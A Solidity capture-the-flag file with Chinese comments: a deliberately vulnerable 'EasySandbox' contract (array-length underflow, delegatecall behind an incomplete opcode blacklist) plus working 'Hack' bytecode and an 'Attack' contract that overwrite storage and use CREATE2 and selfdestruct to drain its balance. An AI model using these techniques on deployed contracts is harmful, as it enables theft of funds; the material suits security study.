// SPXD-License-Identifier: MIT
pragma solidity ^0.5.10;

contract EasySandbox {
    uint256[] public writes;
    mapping(address => address[]) public sons;
    address public owner;
    uint randomNumber = 0;

    constructor() public payable {
        owner = msg.sender;
        sons[msg.sender].push(msg.sender);
        writes.length -= 1;
    }

    // 构造函数中writes.length -= 1，即可以通过writes切片，更改任一slot的值
    function given_gift(uint256 _what, uint256 _where) public {
        if(_where != 0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9f) {
            writes[_where] = _what;
        }
    }

    function easy_sandbox(address _addr) public payable {
        // 自然满足
        require(sons[owner][0] == owner);
        require(writes.length != 0);
        bool mark = false;
        // sons[owner].length改为2
        // 切片存储+1位置设为msg.sender(CA)
        for(uint256 i = 0; i < sons[owner].length; i++) {
            if(msg.sender == sons[owner][i]) {
                mark = true;
            }
        }
        require(mark);

        uint256 size;
        bytes memory code;

        assembly {
            size := extcodesize(_addr)
            code := mload(0x40)
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(code, size)
            extcodecopy(_addr, add(code, 0x20), 0, size)
        }

        // 未禁止create2: 0xf5
        for(uint256 i = 0; i < code.length; i++) {
            require(code[i] != 0xf0); // CREATE
            require(code[i] != 0xf1); // CALL
            require(code[i] != 0xf2); // CALLCODE
            require(code[i] != 0xf4); // DELEGATECALL
            require(code[i] != 0xfa); // STATICCALL
            require(code[i] != 0xff); // SELFDESTRUCT
        }

        bool success;
        bytes memory _;
        // 用的是delegatecall，外部调用的状态变量及context都为本合约
        // 可以通过利用create2清空balance
        (success, _) = _addr.delegatecall("");
        require(success);

        // length改为0
        require(writes.length == 0);
        // sons[owner].length改为1, sons[owner][0]改为EOA
        require(sons[owner].length == 1 && sons[owner][0] == tx.origin);
    }

    
    function isSolved() public view returns (bool) {
        return address(this).balance == 0;
    }
}

// 以下为通关代码，注意如果hash结果又包含禁止的opcodes，通过运算转换掉
// contract address: 0xf8e81D47203A594245E36C48e151709F0C19fBe8
// tx.origin/owner: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4

contract Hack {
    constructor() public {
        assembly {
            /*  1、修改 writes.length == 0
                PUSH1 0x00
                DUP1
                SSTORE
            */

            /*  2、修改writes.length、sons[owner].length和sons[owner][0] = tx.origin
                sons[owner].length所存储slot的key1 = keccak256(bytes32(owner) + bytes32(1))]
                sons[owner][0]所存储slot的key2 = keccak256(bytes32(key1))
                
                PUSH1 0x01
                PUSH2 0x0100
                PUSH32 0x36306db541fd1551fd93a60031e8a8c89d69ddef41d6249f5fdc265dbc8ffea2
                ADD
                SSTORE
                ORIGIN
                PUSH32 0x34a2b38493519efd2aea7c8727c9ed8774c96c96418d940632b22aa9df022106
                SSTORE
            */

            /*  3、create2创建一个只包含selfdestruct(tx.origin)函数的合约
                PUSH2 0x32fe
                PUSH1 0x01
                ADD
                CALLVALUE
                MSTORE
                CALLVALUE
                PUSH1 0x02
                PUSH1 0x1e
                ADDRESS
                BALANCE
                CREATE2
            */
            mstore(0, 0x6000805560016101007f36306db541fd1551fd93a60031e8a8c89d69ddef41d6)
            mstore(0x20, 0x249f5fdc265dbc8ffea20155327f34a2b38493519efd2aea7c8727c9ed8774c9)
            mstore(0x40, 0x6c96418d940632b22aa9df022106556132fe6001013452346002601e3031f500)
            return(0, 0x5f)
        }
    }
}

interface IEasySandbox {
    function easy_sandbox(address) external;
    function given_gift(uint256, uint256) external;
    function owner() external returns(address);
    function isSolved() external view returns(bool);
}


contract Attack {
    IEasySandbox easySandbox = IEasySandbox(0x5FD6eB55D12E759a21C09eF703fe0CBa1DC9d88D);

    function attack() public {
        address owner = easySandbox.owner();
        bytes32 key1 = calculateKey(owner, 1);
        bytes32 key2 = keccak256(abi.encodePacked(key1));
        /*
            使用动态数组改变所有slot时，x为数组值存放的位置，slot[position]存数组长度
            x = keccak256(bytes32(position))，此处writes数组在slot0的位置
            当目标slot的位置n大于x时，writes[n - x]，即可修改slot n
            当目标slot的位置n小于x时，writes[2^256 - x + 1 + n]，即可修改 slot n
        */
        uint256 MAX_SLOT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
        uint256 WRITES_SLOT = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563;
        uint256 SLOT_0 = MAX_SLOT - WRITES_SLOT + 1;

        // key1改为2
        easySandbox.given_gift(2, uint256(key1) - WRITES_SLOT);
        // key2+1位置设为msg.sender(即本合约account)
        easySandbox.given_gift(uint256(address(this)), uint256(key2) - WRITES_SLOT + 1);

        Hack hack = new Hack();
        easySandbox.easy_sandbox(address(hack));

        require(easySandbox.isSolved() == true, "didn't hack successfully");
    }

    function calculateKey(address owner, uint256 position) public pure returns(bytes32) {
        return keccak256(
            abi.encodePacked(
                bytes32(uint256(owner)), bytes32(position)
            )
        );
    }

    function calculateSlot(uint256 position) public pure returns(bytes32){
        return keccak256(
            abi.encodePacked(
                bytes32(position)
            )
        );
    }
}